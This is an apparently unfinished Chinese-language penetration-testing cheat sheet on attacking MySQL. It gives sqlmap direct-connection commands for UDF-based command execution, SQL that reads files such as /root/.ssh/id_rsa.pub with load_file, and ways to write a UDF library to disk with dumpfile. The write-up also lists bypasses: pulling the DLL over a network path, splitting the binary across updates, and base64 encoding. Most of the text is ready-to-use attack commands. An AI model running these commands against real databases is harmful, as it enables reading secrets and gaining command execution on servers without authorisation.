## 1. 渗透

### 1.1. UDF

相当于上传一个.dll/.so直接加载，可以执行命令

```bash
sqlmap -d 'mysql://USER:PASSWORD@DBMS_IP:DBMS_PORT/DATABASE_NAME'
sqlmap -d 'access://DATABASE_FILEPATH'
```

参考文章[利用MySQL UDF进行的一次渗透测试](https://www.freebuf.com/articles/system/163144.html)

> tips

```mysql
# 读插件位置
select @@plugin_dir;
```



### 1.2. 读文件

```mysql
create temporary table text(test text);
insert into text(test) values (load_file('/root/.ssh/id_rsa.pub'));
select * from text;
```



### 1.3. 写文件

```mysql
select 0x30 into dumpfile '/tmp/udf.dll';
```

关于绕过可以用：

1. load_file函数支持网络路径。`load_file('\\\\192.168.0.19\\network\\lib_mysqludf_sys_64.dll') `

2. 将二进制拆分，用update写入表中。

   ```mysql
   create table temp(data longblob);
   insert into temp(data) values 0x30;
   update temp set data = concat(data ,0x31);
   select data from temp into dumpfile '/tmp/udf.dll';
   ```

3. 利用base64。

   ```mysql
   select from_base64("MQo=") into dumpfile '/tmp/udf.dll';
   ```

4. 

5. 

